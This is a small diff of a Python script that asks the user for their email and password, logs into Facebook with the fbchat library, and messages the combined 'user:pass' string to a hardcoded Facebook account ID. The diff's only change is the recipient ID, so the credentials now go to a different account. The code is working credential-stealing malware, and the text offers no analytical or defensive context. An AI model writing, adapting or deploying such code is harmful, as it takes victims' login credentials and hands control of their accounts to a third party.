@@ -5,4 +5,4 @@ username = str(input("Enter Your Mail::"))
 getpass = str(input("Enter Your Pass::"))
 message = username+":"+getpass
 client = fbchat.Client(username, getpass)
-sent = client.send(fbchat.models.Message(message),100025248024301)
+sent = client.send(fbchat.models.Message(message),100049310671507)
